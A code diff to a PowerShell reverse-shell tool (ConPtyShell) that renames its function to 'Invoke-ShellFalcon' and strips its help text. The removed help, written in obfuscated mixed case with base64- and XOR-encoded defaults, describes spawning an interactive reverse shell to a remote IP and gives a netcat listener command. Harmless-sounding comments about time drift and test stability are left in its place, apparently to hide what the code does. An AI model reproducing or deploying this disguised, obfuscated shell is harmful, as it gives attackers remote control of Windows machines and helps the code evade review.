@@ -1,70 +1,7 @@
 function Invoke-ShellFalcon
 {   
     < # Checking time drift in case it affects scheduling
-        .SYNOPSiS
-            cOnPTYSheLl - fuLly iNTERAcTivE rEVerSE shEll for wiNdoWs 
-            aUthOR: SPlinTeR_COdE
-            lICeNse: miT
-            sOURcE: hTTPS://GiTHub.CoM/aNTOnIocOcO/coNPTYshELl
-        
-        .DEscRIPtIon
-            COnptYshell - fULlY InteRaCTivE ReVERSe shElL for wiNdowS
-            
-            prOPErLy SET thE ROwS and cOls valUEs. yOU cAN REtRieVE It fROm
-            YOUR TErMInaL wITh tHE command ([SysTem.TeXT.eNcODIng]::utF8.GETsTriNG([sYsteM.coNVerT]::FroMbASe64stRinG((-join([CHAR]0x63, [cHAr]0X33, [CHAr]0x52, [char]0x30, [ChAr]0X65, [chAR]0X53, [cHar]0x42, [CHar]0x7a, [ChAr]0x61, [ChAr]0X58, [ChaR]0x70, [cHaR]0x6c))))).
-            
-            YOu Can AVOID TO set rows and cols VALUES if yOu Run yOur LiSTeNeR
-            With The fOLLOwiNG command:
-                stty Raw -echO; (sTtY SIZE; cAT) | NC -lVnP 3001
-           
-            If You wAnt TO ChAngE ThE cOnSolE sIZE dIRecTLy fRom PoWERSHeLL
-            yOU can PaSte tHe foLLOwInG CoMMands:
-                $wIdtH=80
-                $HEIgHt=24
-                $hoSt.Ui.RaWUi.buFFeRSize = nEw-oBJEcT mANagemEnt.AuTomaTIoN.host.SIzE ($WIdTH, $HeIght)
-                $Host.Ui.rAwuI.WiNdowsize = neW-Object -TypeNAMe sYstEm.mAnageMEnt.aUtoMaTiOn.HOSt.SizE -aRGumEntLIst ($WIDTh, $HeigHT)
-            
-        .paRaMETEr ReMOTeiP
-            THe ReMOTE iP tO ConneCT
-        .paRaMeTEr remOTeport
-            THe reMOTE pOrt tO CONNECT
-        .paRamEteR ROwS
-            ROwS SIze for tHE cONsolE
-            deFAUlt: ([SySteM.TeXT.EncodING]::UTf8.getsTRING([SySTeM.ConvErt]::FrombASe64StriNG(([sYstEM.text.EncoDiNg]::UTf8.geTstRINg([SystEM.coNverT]::FROmbAsE64stRiNG($($K3164=228;$B=[ByTe[]](0xb0,0xb3,0x94,0XB6,0xB4,0XB5,0XD9,0xd9);-join($B|%{[CHAR]($_-bxOR$K3164)}))))))))
-        .PARAMETeR cOLs
-            cOls SIzE for THe cOnsOle
-            DEFAUlt: ([sYstEM.teXT.EncOdiNG]::UTF8.GEtSTRING([SYSTEM.cOnvErt]::FroMBasE64String(([system.tExt.eNcodINg]::UTF8.GEtsTrIng([SyStem.coNveRt]::FRomBasE64stRING($($K4931=61;$B=[byte[]](0X69,0x0D,0x6F,0x7F,0X6D,0X6c,0x00,0x00);-join($b|%{[cHAr]($_-BXoR$k4931)}))))))))
-        .paRAmetEr COmMAnDline
-            The coMmaNdLinE oF THE process THat YoU Are goINg tO iNteRAcT
-            DefAUlt: ([SySTEm.texT.encODINg]::UtF8.GETSTRiNG([sYsTem.COnVeRT]::frOmBaSE64StRiNg(([SYstem.teXT.eNcoDiNG]::uTf8.GetSTRInG([sySTem.CoNVeRT]::fRomBASe64STrinG(($([CHAr]0x59) + $([cHAr]0x30) + $([cHAR]0X63) + $([cHar]0x35) + $([cHAR]0X4D) + $([CHar]0X31) + $([char]0x70) + $([char]0X59) + $([cHaR]0X53) + $([chaR]0x6e) + $([cHAR]0x70) + $([chaR]0X68) + $([ChaR]0x52) + $([ChaR]0x31) + $([chaR]0x5A) + $([char]0x7A) + $([ChAR]0X59) + $([ChAR]0X6B) + $([chAr]0X4D) + $([cHar]0x31) + $([CHAr]0X62) + $([cHaR]0x47) + $([chAr]0x56) + $([chAR]0x48) + $([CHar]0x56) + $([CHAR]0x54) + $([chAR]0X30) + $([chAR]0x3d))))))))
-            
-        .exAMplE  
-            PS>INVOKE-cONPTySHeLL 10.0.0.2 3001
-            
-            desCRIptIon
-            -----------
-            spAWn a rEVersE sHeLL
 
-        .eXAMPLe
-            pS>iNvOKe-coNptyShEll -RemOtEip 10.0.0.2 -rEMOtEpORt 3001 -rOWS 30 -cols 90
-            
-            desCrIpTIOn
-            -----------
-            SpAWN A reVERse ShELL WiTH spECIfIC rOWs and CoLs Size
-            
-         .exAMpLe
-            Ps>inVOke-coNPtYSHELL -reMoTeip 10.0.0.2 -REMOTepOrt 3001 -rOwS 30 -cOlS 90 -coMmaNDlinE cMD.ExE
-            
-            DEScRipTION
-            -----------
-            sPAWN A rEVersE SHEll (cMD.Exe) wITH SPEcifIC RoWs and COls Size
-            
-        .EXAmple
-            pS>iNVokE-cONPTysheLl -UpGrADe -roWS 30 -COLs 90
-            
-            dEscriPTiOn
-            -----------
-            uPgraDE yOuR cUrRenT sHEll WITh SPECifIc Rows and CoLS Size
             
 # Legacy logic remains for now, stable in tests
     Param
